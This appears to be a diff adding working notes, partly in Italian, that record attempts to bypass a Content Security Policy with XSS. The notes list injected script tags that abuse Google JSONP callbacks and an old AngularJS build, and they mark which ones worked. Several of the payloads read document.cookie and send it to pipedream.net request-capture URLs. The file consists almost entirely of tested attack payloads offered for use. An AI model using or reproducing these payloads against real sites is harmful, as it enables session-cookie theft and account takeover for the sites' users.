@@ -1,0 +1,65 @@
+CSP policy:
+"""default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self'
+ https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'"""
+
+script funzionanti:
+si: "><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+no: "><script src="https://www.google.com/complete?callback=alert#1"></script>
+
+
+
+si: "><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+si: "><script src="https://www.google.com/complete/search?client=chrome&callback=alert#1"></script>
+
+si: "><script src="https://www.google.com/complete/search?client=chrome&callback=alert#'lol'"></script>
+
+no: "><script src="https://www.google.com/complete/search?client=chrome&callback={alert#1}"></script>
+
+no: "><script src="https://www.google.com/complete/search?callback=alert#1"></script>
+
+
+"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+FUNZIONA!!! ---------------------------------------------------------------------------------------------------
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+FUNZIONA!!!! ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+var a = 2; var b = 3; var c = a + b; alert(c)
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('var a = 2; var b = 3; var c = a + b; alert(c)')()}}</div>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+codice vecchio con requestbin nuovo:
+"><script src="https://accounts.google.com/o/oauth2/revoke?callback={url = 'https://enzd6cmhoggppqb.m.pipedream.net/'; url_completo = url.concat(document.cookie); window.open(url_completo)}"></script>
+
+
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('alert(1); url = "https://enzd6cmhoggppqb.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo)')()}}</div>
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('url = "https://enzd6cmhoggppqb.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo); alert(1)')()}}</div>
+
+senza alert:
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('url = "https://enzd6cmhoggppqb.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo)')()}}</div>
+
+
+"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('url = "https://enzd6cmhoggppqb.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo)')()}}</div>
+
+
+
+
+--------------------------------------------
+
+ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+
+
+
+
+"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback="></script>
+
+
+
+
+
+
+ callback={url = 'https://en1jkcvw2a4pg2w.m.pipedream.net/'; url_completo = url.concat(document.cookie); window.open(url_completo)}
